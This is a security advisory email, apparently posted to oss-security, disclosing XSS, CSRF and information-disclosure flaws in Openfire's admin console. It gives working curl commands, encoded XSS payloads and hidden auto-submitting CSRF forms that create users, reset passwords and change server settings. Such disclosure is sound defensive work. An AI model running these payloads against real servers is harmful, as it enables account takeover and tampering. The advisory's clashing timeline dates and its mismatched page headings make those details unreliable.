X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["29405" "Tuesday" "5" "July" "2016" "16:21:32" "+0200" "Sysdream Labs" "labs@sysdream.com" "<577BC26C.8030408@sysdream.com>" "878" "[oss-security] CVE ID Request : OpenFire multiple vulnerabilities" nil nil nil "7" "2016070514:21:32" "[oss-security] CVE ID Request : OpenFire multiple vulnerabilities" (number mark "U       labs@sysdrea Jul  5  878/29405 " thread-indent "\"[oss-security] CVE ID Request : OpenFire multiple vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32517 invoked by uid 550); 5 Jul 2016 14:39:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24331 invoked from network); 5 Jul 2016 14:21:47 -0000
X-Virus-Scanned: amavisd-new at sysdream.com
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
From: Sysdream Labs <labs@sysdream.com>
Message-ID: <577BC26C.8030408@sysdream.com>
Date: Tue, 5 Jul 2016 16:21:32 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.7.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e"
Subject: [oss-security] CVE ID Request : OpenFire multiple vulnerabilities

--oIbcGEmVxLTIHdqXvpeNMOUwUKrERQM6e
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

# Several vulnerabilities doscovered in OpenFire version 3.10.2  to 4.0.1


## Product Description

**OpenFire** is an opensource project under GNU GPL licence. It provides a =
Jabber/XMPP server fully develloped in Java. It's develloped by the **Ignit=
e realtime** community.
The actual version of the product is 4.0.2.=20

Official web site : http://igniterealtime.org/

Several vulnerabilities have been discovered between 2015, October and 2016=
, February.
Reported vulnerabilities are similar to those previously discovered by hyp3=
rlinx, although they concern different pages.

In brief, the flaws are of the following kinds: CSRF, XSS (reflected and st=
ored), file upload and information disclosure. Most vulnerabilities need an=
 administration access to the web application and may lead to personal info=
rmation leakage or account take-over.

**Ingnite realtime** fixed some vulnerabilities (the corresponding commit I=
D are indicated in this document).


## Several Relected XSS Vulnerabilities identified in Openfire 3.10.2

**Access Vector**: remote

**Security Risk**: low

**Vulnerability**: CWE-79

**CVSS Base Score**: 5.2

[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O

### Vulnerability Description

Several XSS vulnerabilities have been found on several pages of the adminis=
tration panel. Reflected XSS may lead to session hijacking on admin user.

### Proof of Concept

#### *domain* and *remotePort* variables from *server2server-settings.jsp*

The following POST values can be sent to trigger the vulnerability:

```
domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&remotePor=
t=3D5269&serverAllowed=3DAdd+Server
```

or

```
domain=3Dtestt&remotePort=3D5269%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3=
C%2Fscript%3E&serverAllowed=3DAdd+Server
```

or

```

domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&serverBlo=
cked=3DBlock+Server
```

You can reproduce the exploitation with the following curl commands:

```
curl --data "domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript=
%3E&remotePort=3D5269&serverAllowed=3DAdd+Server" https://OpenFireServerIP:=
9090/server2server-settings.jsp --cookie=3D"JSESSIONID=3DXXX"=20

curl --data "domain=3Dtest&remotePort=3D5269%22%2F%3E%3Cscript%3Ealert%28%2=
7XSS%27%29%3C%2Fscript%3E&serverAllowed=3DAdd+Server" https://OpenFireServe=
rIP:9090/server2server-settings.jsp --cookie=3D"JSESSIONID=3DXXX"=20

curl --data "domain=3D%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript=
%3E&serverBlocked=3DBlock+Server" https://OpenFireServerIP:9090/server2serv=
er-settings.jsp --cookie=3D"JSESSIONID=3DXXX"=20
```

#### *criteria* variable from *plugins/search/advance-user-search.jsp*

The following GET request exploits the XSS vulnerability:

```
http://OpenFireServerIP:9090/[[http://OpenFireServerIP:9090/plugins/search/=
advance-user-search.jsp?search=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%=
22/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&search=3DSearch
```


## Several stored XSS Vulnerabilities identified in Openfire 3.10.2

**Access Vector**: remote

**Security Risk**: low

**Vulnerability**: CWE-79

**CVSS Base Score**: 5.5

[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O

### Vulnerability Description

Several XSS vulnerabilities have been found on several pages of the adminis=
tration panel. Stored XSS could lead to session hijacking on admin user.

### Proof of Concept

#### *mucdesc* variable from *muc-service-edit-form.jsp*

The following POST values can be sent to trigger the vulnerability:

```
save=3Dtrue&mucname=3Dtest&mucdesc=3Dtest%22%2F%3E%3Cscript%3Ealert%28%27XS=
S-2%27%29%3C%2Fscript%3E
```

The following code allows the creation of a web frame exploiting the vulner=
ability:

```
<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/muc-service-ed=
it-form.jsp" >
<input type=3D"text" name=3D"save" value=3D"true" >
<input type=3D"text" name=3D"mucname" value=3D"test" >
<input type=3D"text" name=3D"mucdesc" value=3D"%22/><script>alert('XSS')</s=
cript>" >
</form>

<script>document.getElementById("xss-form").submit()</script>
```

or with this curl command:

```
curl --data "save=3Dtrue&mucname=3Dtest&mucdesc=3Dtest%22%2F%3E%3Cscript%3E=
alert%28%27XSS-2%27%29%3C%2Fscript%3E" https://OpenFireServerIP:9090/muc-se=
rvice-edit-form.jsp --cookie=3D"JSESSIONID=3DXXX"
```

#### *searchname* variable from *plugins/search/search-props-edit-form.jsp*

The following POST values can be sent to trigger the vulnerability:

```
searchEnabled=3Dtrue&searchname=3Dsearch%22%2F%3E%3Cscript%3Ealert%28%27XSS=
%27%29%3C%2Fscript%3E&groupOnly=3Dfalse
```

The following code allows the creation of a web frame exploiting the vulner=
ability:

```
<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/plugins/search=
/search-props-edit-form.jsp?save" method=3D"post" target=3D"xss-frame" >
<input type=3D"text" name=3D"searchEnabled" value=3D"true" >
<input type=3D"text" name=3D"searchname" value=3D"search%22/><script>alert(=
'XSS')</script>" >
<input type=3D"text" name=3D"groupOnly" value=3D"false" >
</form>

<script>document.getElementById("xss-form").submit()</script>
```

or with this curl command:

```
curl "http://OpenFireServerIP:9090/plugins/search/search-props-edit-form.js=
p" --data=3D"searchEnabled=3Dtrue&searchname=3D%22/%3E%3Cscript%3Ealert('XS=
S')%3C/script%3E&groupOnly=3Dfalse" --cookie=3D"JSESSIONID=3DXXX"
```


#### *searchname* variable from *page plugins/search/search-props-edit-form=
.jsp*

The following POST values can be sent to trigger the vulnerability:

```
propName=3DadminConsole.port&propValue=3D9090%22+onmouseover%3D%22alert%28%=
27xxs%27%29%22+x%3D%22&encrypt=3Dfalse&save=3DSave+Property
```

The following code allows the creation of a web frame exploiting the vulner=
ability:

```
<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/server-propert=
ies.jsp" method=3D"post" target=3D"xss-frame" >
<input type=3D"text" name=3D"propValue" value=3D"=3DadminConsole.port" >
<input type=3D"text" name=3D"searchname" value=3D"9090%22 onmouseover=3D%22=
alert('XSS')%22 x=3D"/>
<input type=3D"text" name=3D"encrypt" value=3D"false" >
<input type=3D"text" name=3D"save" value=3D"Save Property" >
</form>

<script>document.getElementById("xss-form").submit()</script>
```

or with this curl command:

```
curl --data "searchEnabled=3Dtrue&searchname=3Dsearch%22%2F%3E%3Cscript%3Ea=
lert%28%27XSS%27%29%3C%2Fscript%3E&groupOnly=3Dfalse" https://OpenFireServe=
rIP:9090/plugins/search/search-props-edit-form.jsp --cookie=3D"JSESSIONID=
=3DXXX"
```

#### *serverName* variable from *plugins/search/search-props-edit-form.jsp*

The following POST values can be sent to trigger the vulnerability:

```
serverName=3Dlocalhost.localdomain%22%2F%3E%3Cscript%3Ealert%28%27XSS%27%29=
%3C%2Fscript%3E&serverPort=3D5269&componentPort=3D5275&port=3D5222&sslEnabl=
ed=3Dtrue&sslPort=3D5223&embeddedPort=3D9090&embeddedSecurePort=3D9091&jmxE=
nabled=3Dfalse&jmxSecure=3Dtrue&jmxPort=3D1099&save=3DSave+Properties
```

The following code allows the creation of a web frame exploiting the vulner=
ability:

```
<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/server-props.j=
sp" method=3D"post" target=3D"xss-frame" >
<input type=3D"text" name=3D"serverName" value=3D"localhost.localdomain%22%=
2F%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" >
<input type=3D"text" name=3D"serverPort" value=3D"5269" >
<input type=3D"text" name=3D"componentPort" value=3D"5275" >
<input type=3D"text" name=3D"port" value=3D"5222" >
<input type=3D"text" name=3D"sslEnabled" value=3D"true" >
<input type=3D"text" name=3D"sslPort" value=3D"5223" >
<input type=3D"text" name=3D"embeddedPort" value=3D"9090" >
<input type=3D"text" name=3D"embeddedSecurePort" value=3D"9091" >
<input type=3D"text" name=3D"jmxEnabled" value=3D"false" >
<input type=3D"text" name=3D"jmxSecure" value=3D"true" >
<input type=3D"text" name=3D"jmxPort" value=3D"1099" >
<input type=3D"text" name=3D"save" value=3D"Save+Properties" >
</form>

<script>document.getElementById("xss-form").submit()</script>
```

or with this curl command:

```
curl --data "serverName=3Dlocalhost.localdomain%22%2F%3E%3Cscript%3Ealert%2=
8%27XSS%27%29%3C%2Fscript%3E&serverPort=3D5269&componentPort=3D5275&port=3D=
5222&sslEnabled=3Dtrue&sslPort=3D5223&embeddedPort=3D9090&embeddedSecurePor=
t=3D9091&jmxEnabled=3Dfalse&jmxSecure=3Dtrue&jmxPort=3D1099&save=3DSave+Pro=
perties" https://OpenFireServerIP:9090/server-props.jsp --cookie=3D"JSESSIO=
NID=3DXXX"
```

### Affected versions

* Version >=3D 3.10.2 and < 4.0.0


## Several Relected XSS Vulnerabilities identified in Openfire 4.0.0 and 4.=
0.1

**Access Vector**: remote

**Security Risk**: low

**Vulnerability**: CWE-79

**CVSS Base Score**: 5.2

[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
H/UI:R/S:U/C:H/I:L/A:N/E:F/RL:O

### Vulnerability Description

Several XSS vulnerabilities have been found on several pages of the adminis=
tration panel. Reflected XSS could lead to session hijacking against an adm=
inistrator.

Some of these vulnerabilities have already been found by hyp3rlinx, but had=
 not been patched properly.

### Proof of Concept

#### *groupchatName*, *groupchatJID*, *users* and *groups* variables from *=
page create-bookmark.jsp* suffer from the vulnerability

The following POST values can be sent to trigger the vulnerability:

```
groupchatName=3D%22%3E%3Cscript%3Ealert%28%27XSS1%27%29%3C%2Fscript%3E&grou=
pchatJID=3D%22%3E%3Cscript%3Ealert%28%27XSS2%27%29%3C%2Fscript%3E%C2%B2&use=
rs=3D%22%3E%3Cscript%3Ealert%28%27XSS3%27%29%3C%2Fscript%3E&groups=3D%22%3E=
%3Cscript%3Ealert%28%27XSS4%27%29%3C%2Fscript%3E&createGroupchatBookmark=3D=
Create&type=3Dgroupchat
```

The following curl command allows reproducing the attack against the Openfi=
re *plugins/bookmarks/create-bookmark.jsp* page:

```
curl --data "save=3Dtrue&mucname=3Dconference&mucdesc=3DPublic+Chatrooms%22=
%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" https://OpenFireServerI=
P:9090/muc-service-edit-form.jsp --cookie=3D"JSESSIONID=3DXXX"
```

#### *search* variable from *group-summary.jsp*

The following GET request exploit the XSS vulnerability:

```
http://OpenFireServerIP:9090/group-summary.jsp?search=3Dtest%22+onmouseover=
%3Dalert%28%27XSS%27%29+x%3D%22
```

The following curl command allows reproducing the attack against the Openfi=
re *group-summary.jsp* page.

```
curl http://OpenFireServerIP:9090/group-summary.jsp?search=3Dtest%22+onmous=
eover%3Dalert%28%27XSS%27%29+x%3D%22 --cookie=3D"JSESSIONID=3DXXX"
```


#### *maxTotalSize*, *maxFileSize*, *maxDays*, *logTimeout* variables from =
*audit-policy.jsp*

The following GET request exploit the XSS vulnerability:

```
http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=3Dfalse&logDir=
=3D%2Fopt%2Fopenfire%2Flogs&maxTotalSize=3D1000%22%3E%3Cscript%3Ealert%28%2=
7XSS3%27%29%3C%2Fscript%3E&maxFileSize=3D10%22%3E%3Cscript%3Ealert%28%27XSS=
4%27%29%3C%2Fscript%3E&maxDays=3D-1%22%3E%3Cscript%3Ealert%28%27XSS5%27%29%=
3C%2Fscript%3E&logTimeout=3D120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%3C%2=
Fscript%3E&ignore=3D&update=3DSave+Settings
```

The following curl command allows reproducing the attack against the Openfi=
re *audit-policy.jsp* page:

```
curl "http://OpenFireServerIP:9090/audit-policy.jsp?auditEnabled=3Dfalse&lo=
gDir=3D%2Fopt%2Fopenfire%2Flogs&maxTotalSize=3D1000%22%3E%3Cscript%3Ealert%=
28%27XSS3%27%29%3C%2Fscript%3E&maxFileSize=3D10%22%3E%3Cscript%3Ealert%28%2=
7XSS4%27%29%3C%2Fscript%3E&maxDays=3D-1%22%3E%3Cscript%3Ealert%28%27XSS5%27=
%29%3C%2Fscript%3E&logTimeout=3D120%22%3E%3Cscript%3Ealert%28%27XSS6%27%29%=
3C%2Fscript%3E&ignore=3D&update=3DSave+Settings" --cookie=3D"JSESSIONID=3DX=
XX"
```

#### *passPhrase* variables from *import-keystore-certificate.jsp*

The following POST values exploit the XSS vulnerability:

```
passPhrase=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&privateK=
ey=3Dtest&certificate=3Dtest&save=3DSave
```

The following curl command allows reproducing the attack against the Openfi=
re *import-keystore-certificate.jsp* page.

```
curl http://OpenFireServerIP:9090/import-keystore-certificate.jsp --data=3D=
"passPhrase=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&private=
Key=3Dtest&certificate=3Dtest&save=3DSave" --cookie=3D"JSESSIONID=3DXXX"
```

#### *criteria* variable from */plugins/search/advance-user-search.jsp*

The following GET request exploit the XSS vulnerability:

```
http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?search=
=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%22/%3E%3Cscript%3Ealert%28%27X=
SS%27%29%3C/script%3E&search=3DSearch
```

The following curl command allows reproducing the attack against the Openfi=
re *plugins/search/advance-user-search.jsp* admin page.

```
curl "http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?s=
earch=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%22/%3E%3Cscript%3Ealert%2=
8%27XSS%27%29%3C/script%3E&search=3DSearch" --cookie=3D"JSESSIONID=3DXXX"
```

### Affected versions

* Version 4.0.0 and 4.0.1

## Several stored XSS Vulnerabilities identified in Openfire 4.0.0 and 4.0.1

Some of these vulnerabilities have already been found by hyp3rlinx, but has=
 not been patched since.

**Access Vector**: remote

**Security Risk**: low

**Vulnerability**: CWE-79

**CVSS Base Score**: 5.5

[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O

### Vulnerability Description

Several XSS vulnerabilities have been found on several pages of the adminis=
tration panel. Stored XSS could lead to session hijacking on admin user.

### Proof of Concept

#### *subdomain* variable from *connection-settings-external-components.jsp*

The following curl command allows reproducing the attack against the Openfi=
re *connection-settings-external-components.jsp* page:

```
curl --data "subdomain=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript=
%3E&secret=3Dtoto&componentAllowed=3DAdd+Component" https://OpenFireServerI=
P:9090/connection-settings-external-components.jsp --cookie=3D"JSESSIONID=
=3DXXX"
```

Or

```
curl --data "subdomain=3D%22%3Escript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E=
&componentBlocked=3DBlock+Component" https://OpenFireServerIP:9090/connecti=
on-settings-external-components.jsp --cookie=3D"JSESSIONID=3DXXX"
```

#### *mucdesc* variable from *muc-service-edit-form.jsp*

The following curl command allows reproducing the attack against the Openfi=
re *muc-service-edit-form.jsp* page:

```
curl --data "groupchatName=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fsc=
ript%3E&groupchatJID=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3=
E%C2%B2&users=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&group=
s=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBo=
okmark=3DCreate&type=3Dgroupchat" https://OpenFireServerIP:9090/plugins/boo=
kmarks/create-bookmark.jsp --cookie=3D"JSESSIONID=3DXXX"
```

#### *groupchatName*, *groupchatJID*, *users* and *groups* variables from p=
age muc-service-edit-form.jsp

The following curl command allows reproducing the attack against the Openfi=
re *muc-service-edit-form.jsp* page:

```
curl --data "groupchatName=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fsc=
ript%3E&groupchatJID=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3=
E%C2%B2&users=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&group=
s=3D%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&createGroupchatBo=
okmark=3DCreate&type=3Dgroupchat" https://OpenFireServerIP:9090/plugins/boo=
kmarks/create-bookmark.jsp --cookie=3D"JSESSIONID=3DXXX"
```

#### *searchname* variable from *plugins/search/search-props-edit-form.jsp*

The following curl command allows reproducing the attack against the Openfi=
re *plugins/search/advance-user-search.jsp* page:

```
curl "http://OpenFireServerIP:9090/plugins/search/advance-user-search.jsp?s=
earch=3Dtrue&moreOptions=3Dfalse&criteria=3Dadmin%22/%3E%3Cscript%3Ealert%2=
8%27XSS%27%29%3C/script%3E&search=3DSearch" --cookie=3D"JSESSIONID=3DXXX"
```

The folling code allows exploiting the vulnerability:

```
<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/plugins/search=
/search-props-edit-form.jsp?save" method=3D"post" target=3D"xss-frame" >
<input type=3D"text" name=3D"searchEnabled" value=3D"true" >
<input type=3D"text" name=3D"searchname" value=3D"search%22/><script>alert(=
'XSS')</script>" >
<input type=3D"text" name=3D"groupOnly" value=3D"false" >
</form>

<script>document.getElementById("xss-form").submit()</script>
```

#### *propValue* variable from *server-properties.jsp*

The following curl command allows reproducing the attack against the Openfi=
re *server-properties.jsp* page:

```
curl --data=3D"propName=3DadminConsole.port&propValue=3D9090%22+onmouseover=
%3D%22alert%28%27xxs%27%29%22+x%3D%22&encrypt=3Dfalse&save=3DSave+Property"=
 http://OpenFireServerIP:9090/server-properties.jsp --cookie=3D"JSESSIONID=
=3DXXX"
```

The folling code allows exploiting the vulnerability:

```
<iframe style=3D"display:none" name=3D"xss-frame"></iframe>
<form id=3D"xss-form" action=3D"http://OpenFireServerIP:9090/server-propert=
ies.jsp" method=3D"post" target=3D"xss-frame" >
<input type=3D"text" name=3D"propValue" value=3D"=3DadminConsole.port" >
<input type=3D"text" name=3D"searchname" value=3D"9090%22 onmouseover=3D%22=
alert('XSS')%22 x=3D"/>
<input type=3D"text" name=3D"encrypt" value=3D"false" >
<input type=3D"text" name=3D"save" value=3D"Save Property" >
</form>

<script>document.getElementById("xss-form").submit()</script>
```


###Affected versions

* Version 4.0.0 and 4.0.1


## Several CSRF Vulnerabilities identified in Openfire 3.10.2

**Access Vector**: remote

**Security Risk**: low

**Vulnerability**: CWE-312

**CVSS Base Score**: 5.4

[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O

### Vulnerability Description

Several CSRF vulnerabilities have been found on different pages of the admi=
n panel of the OpenFire web server. Throught this attack an attacker could =
drive a valid user to execute unwittingly a request on the OpenFire sever.


### Proof of Concept

#### *connection-settings-external-components.jsp* page is vulerable to a C=
SRF attack.

The following HTML iframe command allows reproducing the attack against the=
 Openfire *dwr/exec/downloader.installPlugin.dwr* page:

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/dwr/exec/down=
loader.installPlugin.dwr" method=3D"post" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"callCount" value=3D"1" >
    <input type=3D"text" name=3D"c0-scriptName" value=3D"downloader" >
    <input type=3D"text" name=3D"c0-methodName" value=3D"installPlugin" >
    <input type=3D"text" name=3D"c0-id" value=3D"9033_1444939787005" >
    <input type=3D"text" name=3D"c0-param0" value=3D"string:http://www.igni=
terealtime.org/projects/openfire/plugins/broadcast.jar" >
    <input type=3D"text" name=3D"c0-param1" value=3D"string:8221154" >
    <input type=3D"text" name=3D"xml" value=3D"true" >
</form>

<script>document.getElementById("csrf-form").submit()</script>
```


#### *client-connections-settings.jsp* is vulerable to a CSRF attack.

The following HTML iframe command allows reproducing the attack against the=
 Openfire *client-connections-settings.jsp* page:

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/client-connec=
tions-settings.jsp" method=3D"post" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"port" value=3D"5222" >
    <input type=3D"text" name=3D"sslEnabled" value=3D"false" >
    <input type=3D"text" name=3D"sslPort" value=3D"5223" >
    <input type=3D"text" name=3D"idleDisco" value=3D"true" >
    <input type=3D"text" name=3D"clientIdle" value=3D"360" >
    <input type=3D"text" name=3D"pingIdleClients" value=3D"true" >
    <input type=3D"text" name=3D"update" value=3D"Save Settings" >
</form>

<script>document.getElementById("csrf-form").submit()</script>
```

#### *manage-updates.jsp* is vulerable to a CSRF attack.

The following HTML iframe command allows reproducing the attack against the=
 *Openfire manage-updates.jsp* page:

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/manage-update=
s.jsp" method=3D"post" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"serviceEnabled" value=3D"false" >
    <input type=3D"text" name=3D"notificationsEnabled" value=3D"false" >
    <input type=3D"text" name=3D"proxyEnabled" value=3D"true" >
    <input type=3D"text" name=3D"proxyHost" value=3D"10.0.0.1" >
    <input type=3D"text" name=3D"proxyPort" value=3D"6666" >
    <input type=3D"text" name=3D"update" value=3D"Save Settings" >
</form>

<script>document.getElementById("csrf-form").submit()</script>
```

#### *plugin-admin.jsp* is vulerable to a CSRF attack.

The following HTML iframe command allows reproducing the attack against the=
 Openfire *plugin-admin.jsp* page.

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/plugin-admin.=
jsp" method=3D"get" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"deleteplugin" value=3D"broadcast" >
</form>


<script>document.getElementById("csrf-form").submit()</script>
```

The following HTML iframe command allows reproducing the attack against the=
 Openfire *reg-settings.jsp* page:

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/reg-settings.=
jsp" method=3D"get" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"inbandEnabled" value=3D"false" >
    <input type=3D"text" name=3D"canChangePassword" value=3D"false" >
    <input type=3D"text" name=3D"anonLogin" value=3D"fasle" >
    <input type=3D"text" name=3D"allowedIPs" value=3D"0.0.0.0" >
    <input type=3D"text" name=3D"allowedAnonymIPs" value=3D"0.0.0.0" >
    <input type=3D"text" name=3D"save" value=3D"Save Settings" >
</form>


<script>document.getElementById("csrf-form").submit()</script>
```

#### *server-properties.jsp* is vulerable to a CSRF attack.

The following HTML iframe command allows reproducing the attack against the=
 Openfire *server-properties.jsp* admin page.

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/server-proper=
ties.jsp" method=3D"post" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"propName" value=3D"test" >
    <input type=3D"text" name=3D"propValue" value=3D"test" >
    <input type=3D"text" name=3D"encrypt" value=3D""false >
    <input type=3D"text" name=3D"save" value=3D"Save Property" >
</form>

<script>document.getElementById("csrf-form").submit()</script>
```

#### *system-email.jsp* is vulerable to a CSRF attack.

The following HTML iframe command allows reproducing the attack against the=
 Openfire *system-email.jsp* admin page.

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/system-email.=
jsp" method=3D"post" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"host" value=3D"mail.google.com" >
    <input type=3D"text" name=3D"port" value=3D"25" >
    <input type=3D"text" name=3D"debug" value=3D"false" >
    <input type=3D"text" name=3D"server_username" value=3D"toto" >
    <input type=3D"text" name=3D"server_password" value=3D"toto" >
    <input type=3D"text" name=3D"save" value=3D"Save Changes" >
</form>
```

### Affected versions

* Version >=3D 3.10.2 and < 4.0.0


## Several CSRF Vulnerabilities identified in Openfire 3.10.2

**Access Vector**: remote

**Security Risk**: low

**Vulnerability**: CWE-312

**CVSS Base Score**: 5.4

[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O

### Vulnerability Description

Several CSRF vulnerabilities have been found on different pages of the admi=
n panel of the OpenFire web server. Through this attack, an attacker could =
drive a valid user to execute unwittingly a request to the OpenFire sever.

These vulnerabilities have already been found by hyp3rlinx, but had not bee=
n patched yet.

### Proof of Concept

#### *connection-settings-external-components.jsp* is vulerable to a CSRF a=
ttack.

The following HTML iframe command allows reproducing the attack against the=
 Openfire *dwr/exec/downloader.installPlugin.dwr* page:

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/user-create.j=
sp" method=3D"get" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"name" value=3D"Evil" >
    <input type=3D"text" name=3D"email" value=3D"evil@evil.f" >
    <input type=3D"text" name=3D"password" value=3D"evil" >
    <input type=3D"text" name=3D"passwordConfirm" value=3D"evil" >
    <input type=3D"text" name=3D"create" value=3D"Create+User" >
</form>

<script>document.getElementById("csrf-form").submit()</script>
```

#### *client-connections-settings.jsp* is vulerable to a CSRF attack.

The following HTML iframe command allows reproducing the attack against the=
 Openfire *client-connections-settings.jsp* page.

```
<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://OpenFireServerIP:9090/user-password=
.jsp" method=3D"post" target=3D"csrf-frame" >
    <input type=3D"text" name=3D"username" value=3D"victim" >
    <input type=3D"text" name=3D"password" value=3D"evil" >
    <input type=3D"text" name=3D"passwordConfirm" value=3D"evil" >
    <input type=3D"text" name=3D"update" value=3D"Update+Password" >
</form>

<script>document.getElementById("csrf-form").submit()</script>
```

### Affected versions

* Version 4.0.0 and 4.0.1


## Sensitive information disclosure in OpenFire Server <=3D3.10.2

**Access Vector**: remote

**Security Risk**: low

**Vulnerability**: CWE-200

**CVSS Base Score**: 5.5

[comment]: https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:=
H/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O

### Vulnerability Description

A sensitive information disclosure vulnerabilty is present in the page *sys=
tem-email.jsp*. It allow's an authenticated user to retreive the md5 hash t=
he password of an email account.

### Vulnerable code

The following HTML code is reveived by an authenticated user on the page sy=
stem-email.jsp. The md5 hash of the password is sent to the user.

```
<tr>
    <td nowrap>
        Server Username (Optional):
    </td>
    <td nowrap>
        <input type=3D"text" name=3D"server_username" value=3D"myusername" =
size=3D"40" maxlength=3D"150">
    </td>
</tr>
<tr>
    <td nowrap>
        Server Password (Optional):
    </td>
    <td nowrap>
        <input type=3D"password" name=3D"server_password" value=3D"34819d7b=
eeabb9260a5c854bc85b3e44" size=3D"40" maxlength=3D"150">
    </td>
</tr>
```


### Affected versions

* Version >=3D3.10.2 and <4.0.2

### Fixes

* https://github.com/igniterealtime/Openfire/pull/570

### Solution

Update to version 4.0.2

### Timeline (dd/mm/yyyy)

* 15/10/2014 : Initial discovery
* 19/10/2015 : Contact with vendor team
* 27/11/2014 : vendor fixes vulnerabilities
* 27/11/2014 : vendor releases version 4.0.2, which includes the fixes

## Credits

* Florian Nivette <f.nivette@sysdream.com>




--=20
